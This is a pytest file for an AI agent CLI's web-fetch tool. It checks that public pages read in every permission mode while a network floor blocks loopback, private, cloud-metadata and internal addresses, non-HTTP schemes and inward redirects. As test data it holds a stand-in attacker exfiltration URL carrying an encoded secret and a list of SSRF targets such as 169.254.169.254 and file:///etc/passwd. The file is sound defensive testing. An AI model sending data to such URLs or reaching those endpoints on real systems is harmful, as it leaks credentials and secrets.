"""``web.fetch`` reads a public page in every mode; WHERE it may go is the floor.

Searching and then reading what the search found are two halves of one loop, so
they answer the same way: both are READ, in ``read_only`` and ``plan`` as much as
in ``default`` and ``auto``, and on every surface a chat runs on. A stance that
allows the search and refuses the page leaves the agent holding link titles it
was told not to open.

What does NOT move with the mode is the address the request may reach. On a box,
``169.254.169.254`` hands out the machine's cloud credentials and ``10.x`` /
``127.0.0.1`` are its neighbours and its own services, so a read of "a web page"
must never land there — not on the URL the model named, and not after a redirect
that the model did not choose. These cases drive that floor from the outside:
every refusal here is proven by the request never being made.
"""

from __future__ import annotations

from pathlib import Path
from types import SimpleNamespace
from typing import Any, ClassVar
from unittest.mock import patch

import pytest
from _decision_sink import MemorySink
from alkera_cli.contracts.tool_types import Effect
from alkera_cli.plugins.plugin_base.meta_tools import register_meta_tools
from alkera_cli.plugins.plugin_base.tool import ToolRegistry, tool_in_scope
from alkera_cli.plugins.plugin_base.web_tools import (
    WebFetchTool,
    WebSearchTool,
    register_web_tools,
)
from alkera_core.project.directory import ProjectDirectory

_URL = "https://site.example/page"
_EXFIL_URL = "https://collect.attacker.example/?d=c2VjcmV0"
_PUBLIC_ADDRESS = "93.184.216.34"

#: Every mode a chat can be put in. A fetch answers the same in all of them —
#: parametrizing over the whole set is what stops a later mode-specific branch
#: from quietly re-splitting the search/read loop.
MODES = [
    pytest.param("read_only", id="read_only"),
    pytest.param("plan", id="plan"),
    pytest.param("default", id="default"),
    pytest.param("auto", id="auto"),
]


class _Broker:
    """Stands in for the session permission broker; records what it was asked."""

    def __init__(self, option: str = "allow_once") -> None:
        self.option = option
        self.requests: list[Any] = []

    async def resolve(self, request: Any) -> str:
        self.requests.append(request)
        return self.option


class _Response:
    """The slice of primp's streamed response ``_run_fetch`` reads."""

    status_code = 200
    url = _URL
    headers: ClassVar[dict[str, str]] = {"content-type": "text/plain"}

    def iter_bytes(self, chunk: int | None = None) -> Any:
        return iter([b"page body"])

    def close(self) -> None:
        return None


def _hop(url: str, *, status: int = 200, location: str | None = None) -> SimpleNamespace:
    """A redirect (``location`` set) or a terminal page, as primp hands it back."""
    headers = {"content-type": "text/plain"}
    if location is not None:
        headers["location"] = location
    return SimpleNamespace(
        status_code=status,
        url=url,
        headers=headers,
        iter_bytes=lambda chunk=None: iter([b"page body"]),
        close=lambda: None,
    )


def _registry(tmp_path: Path, *, sink: Any) -> ToolRegistry:
    blobs = ProjectDirectory(tmp_path / ".alkera").blobs()
    registry = ToolRegistry(blobs, decision_sink=sink)
    register_meta_tools(registry)
    register_web_tools(registry)
    return registry


async def _fetch(
    tmp_path: Path,
    *,
    mode: str = "default",
    broker: Any,
    sink: Any,
    url: str = _URL,
    resolves_to: list[str] | None = None,
    hops: list[Any] | None = None,
) -> tuple[dict[str, Any], list[str]]:
    """Dispatch a fetch and report the tool result plus the URLs that actually
    went over the wire — the refusals below are only refusals if that list is
    empty."""
    registry = _registry(tmp_path, sink=sink)
    addresses = [(2, 1, 6, "", (addr, 0)) for addr in (resolves_to or [_PUBLIC_ADDRESS])]
    with (
        patch("socket.getaddrinfo", return_value=addresses),
        patch("primp.Client") as client_cls,
    ):
        client_cls.return_value.get.side_effect = hops or [_Response()]
        out = await registry.dispatch(
            "web.fetch",
            {"url": url},
            broker=broker,
            permission_mode=mode,
            alkera_dir=tmp_path / ".alkera",
        )
    requested = [call.args[0] for call in client_cls.return_value.get.call_args_list]
    return out, requested


# --- the declared effect ----------------------------------------------------


def test_both_web_tools_declare_a_read() -> None:
    """The hint is what decides whether the dispatcher demands a broker and
    whether a read-only subagent is offered the tool at all — so the two halves
    of the loop have to carry the same one."""
    assert WebFetchTool.spec.effect_hint == Effect.READ
    assert WebSearchTool.spec.effect_hint == Effect.READ


def test_a_read_only_subagent_is_offered_both_halves_of_the_loop() -> None:
    """An explore subagent is the one sent to find things out. Offering it the
    search and withholding the page leaves it citing snippets."""
    assert tool_in_scope(WebSearchTool.spec, "read_only") is True
    assert tool_in_scope(WebFetchTool.spec, "read_only") is True


# --- a public page, in every mode -------------------------------------------


@pytest.mark.parametrize("mode", MODES)
async def test_a_public_page_reads_in_every_mode_without_asking(tmp_path: Path, mode: str) -> None:
    """The broker would REFUSE if it were asked, so a page coming back proves the
    read was admitted by its classification and not by an approval."""
    broker = _Broker("reject_once")
    sink = MemorySink()

    out, requested = await _fetch(tmp_path, mode=mode, broker=broker, sink=sink)

    assert "error" not in out, out
    assert out["content"] == "page body"
    assert requested == [_URL]
    assert broker.requests == [], "a page read must not raise a prompt"
    assert [(r.effect, r.decision) for r in sink.records] == [("read", "allow")]


@pytest.mark.parametrize("mode", MODES)
async def test_a_url_the_model_composed_reads_like_any_other(tmp_path: Path, mode: str) -> None:
    """There is no seen-result set any more: a URL the model wrote itself is a
    page read on the same terms as one a search returned."""
    out, requested = await _fetch(
        tmp_path, mode=mode, url=_EXFIL_URL, broker=_Broker("reject_once"), sink=MemorySink()
    )

    assert "error" not in out, out
    assert requested == [_EXFIL_URL]


async def test_a_fetch_runs_with_no_broker_wired_at_all(tmp_path: Path) -> None:
    """A read-effect tool is not a write-effect one: the dispatcher's broker
    precondition does not apply, so a session that never wired a prompt path
    still reads pages — exactly as it already searched."""
    out, requested = await _fetch(tmp_path, broker=None, sink=MemorySink())

    assert "error" not in out, out
    assert requested == [_URL]


async def test_search_still_runs_with_no_broker_and_no_prompt(tmp_path: Path) -> None:
    """The neighbouring half of the loop is untouched."""
    broker = _Broker("reject_once")
    registry = _registry(tmp_path, sink=MemorySink())
    with patch(
        "alkera_cli.plugins.plugin_base.web_tools._run_search",
        return_value=[],
    ):
        out = await registry.dispatch("web.search", {"query": "anything"}, broker=broker)
    assert "error" not in out, out
    assert broker.requests == []


# --- the network floor: where a read may NOT go -----------------------------
#
# Each row is an address class the box must never be made to read, named the way
# a model would name it. The mode is parametrized across all four because this
# floor is the one thing a stance cannot lift.


#: The floor's own refusals. Asserting the reason is what keeps these rows
#: honest: a case that stopped for an unrelated reason — a rejected input, a
#: prompt — would otherwise read as the floor holding when it had not been
#: reached at all.
_NON_PUBLIC = "refuses non-public addresses"
_LOCAL_NAME = "refuses local/internal hosts"
_SCHEME = "only fetches http(s)"
_NO_HOST = "URL has no host"


@pytest.mark.parametrize("mode", MODES)
@pytest.mark.parametrize(
    ("url", "resolves_to", "reason"),
    [
        pytest.param("http://127.0.0.1:8080/admin", None, _NON_PUBLIC, id="loopback-literal"),
        pytest.param("http://[::1]/admin", None, _NON_PUBLIC, id="loopback-v6-literal"),
        pytest.param("http://localhost:5432/", None, _LOCAL_NAME, id="localhost-by-name"),
        pytest.param("http://db.localhost/", None, _LOCAL_NAME, id="a-localhost-subdomain"),
        pytest.param("http://printer.local/", None, _LOCAL_NAME, id="an-mdns-name"),
        pytest.param("http://vault.internal/v1/secret", None, _LOCAL_NAME, id="an-internal-name"),
        pytest.param(
            "http://169.254.169.254/latest/meta-data/", None, _NON_PUBLIC, id="cloud-metadata"
        ),
        pytest.param(
            "http://metadata.example/computeMetadata/v1/",
            ["169.254.169.254"],
            _NON_PUBLIC,
            id="cloud-metadata-behind-a-public-name",
        ),
        pytest.param("http://10.0.0.5/", None, _NON_PUBLIC, id="private-10"),
        pytest.param("http://192.168.1.1/", None, _NON_PUBLIC, id="private-192-168"),
        pytest.param("http://172.16.0.1/", None, _NON_PUBLIC, id="private-172-16"),
        pytest.param("http://100.64.0.1/", None, _NON_PUBLIC, id="carrier-grade-nat"),
        pytest.param("http://0.0.0.0/", None, _NON_PUBLIC, id="the-unspecified-address"),
        pytest.param("http://[fd00::1]/", None, _NON_PUBLIC, id="unique-local-v6"),
        pytest.param("http://[fe80::1]/", None, _NON_PUBLIC, id="link-local-v6"),
        pytest.param("http://[::ffff:127.0.0.1]/", None, _NON_PUBLIC, id="ipv4-mapped-loopback"),
        pytest.param(
            "http://neighbour.example/", ["10.1.2.3"], _NON_PUBLIC, id="a-name-resolving-inward"
        ),
        pytest.param(
            "http://2130706433/", ["127.0.0.1"], _NON_PUBLIC, id="loopback-as-one-integer"
        ),
        pytest.param("file:///etc/passwd", None, _SCHEME, id="not-even-http"),
        pytest.param("ftp://site.example/x", None, _SCHEME, id="another-scheme"),
        pytest.param("http:///nohost", None, _NO_HOST, id="no-host-at-all"),
    ],
)
async def test_a_non_public_address_is_refused_in_every_mode(
    tmp_path: Path, mode: str, url: str, resolves_to: list[str] | None, reason: str
) -> None:
    out, requested = await _fetch(
        tmp_path,
        mode=mode,
        url=url,
        resolves_to=resolves_to,
        broker=_Broker("allow_once"),
        sink=MemorySink(),
    )

    assert reason in out.get("error", ""), out
    assert requested == [], "the floor has to hold BEFORE the request is made"


@pytest.mark.parametrize("mode", MODES)
async def test_a_name_that_answers_with_one_public_and_one_private_address_is_refused(
    tmp_path: Path, mode: str
) -> None:
    """A host is not admitted on its best answer. Resolving to a public address
    alongside an internal one is how a name gets a read onto the private network
    while looking ordinary."""
    out, requested = await _fetch(
        tmp_path,
        mode=mode,
        url="http://split.example/",
        resolves_to=[_PUBLIC_ADDRESS, "10.0.0.7"],
        broker=_Broker("allow_once"),
        sink=MemorySink(),
    )

    assert _NON_PUBLIC in out.get("error", ""), out
    assert "10.0.0.7" in out["error"], "the refusal names the address that failed"
    assert requested == []


# --- the floor holds at the redirect the model did not choose ---------------


@pytest.mark.parametrize("mode", MODES)
@pytest.mark.parametrize(
    ("location", "reason"),
    [
        pytest.param(
            "http://169.254.169.254/latest/meta-data/", _NON_PUBLIC, id="onto-cloud-metadata"
        ),
        pytest.param("http://127.0.0.1:8080/admin", _NON_PUBLIC, id="onto-loopback"),
        pytest.param("http://10.0.0.5/", _NON_PUBLIC, id="onto-the-private-network"),
        pytest.param("http://vault.internal/v1/secret", _LOCAL_NAME, id="onto-an-internal-name"),
        pytest.param("file:///etc/passwd", _SCHEME, id="onto-another-scheme"),
    ],
)
async def test_a_redirect_inward_is_refused_and_never_followed(
    tmp_path: Path, mode: str, location: str, reason: str
) -> None:
    """The server, not the model, picks a redirect's destination — which is
    exactly why the hop is re-checked instead of trusted."""
    hops = [_hop(_URL, status=302, location=location), _hop(location)]

    out, requested = await _fetch(
        tmp_path, mode=mode, hops=hops, broker=_Broker("allow_once"), sink=MemorySink()
    )

    assert reason in out.get("error", ""), out
    assert requested == [_URL], "the second hop must never be requested"


@pytest.mark.parametrize("mode", MODES)
async def test_a_redirect_between_public_pages_is_followed(tmp_path: Path, mode: str) -> None:
    """The floor refuses a destination, not redirects: an ordinary move between
    public pages still lands."""
    landed = "https://site.example/page-v2"
    hops = [_hop(_URL, status=302, location=landed), _hop(landed)]

    out, requested = await _fetch(
        tmp_path, mode=mode, hops=hops, broker=_Broker("reject_once"), sink=MemorySink()
    )

    assert "error" not in out, out
    assert requested == [_URL, landed]


# --- the audit trail --------------------------------------------------------


async def test_every_fetch_decision_is_recorded_with_the_url(tmp_path: Path) -> None:
    """A read is still a decision, and the record is what lets someone
    reconstruct afterwards which pages a turn opened."""
    sink = MemorySink()

    await _fetch(tmp_path, broker=_Broker("allow_once"), sink=sink, url=_EXFIL_URL)

    assert len(sink.records) == 1
    record = sink.records[0]
    assert record.effect == "read"
    assert record.capability == "network"
    assert record.decision == "allow"
    assert _EXFIL_URL in (record.raw or "")


async def test_a_fetch_without_a_decisions_log_is_refused(tmp_path: Path) -> None:
    """A page read is permitted by every stance, but not off the record: with
    nowhere to write the decision the request is not made."""
    out, requested = await _fetch(tmp_path, broker=_Broker("allow_once"), sink=None)

    assert "permission denied" in out.get("error", ""), out
    assert requested == []
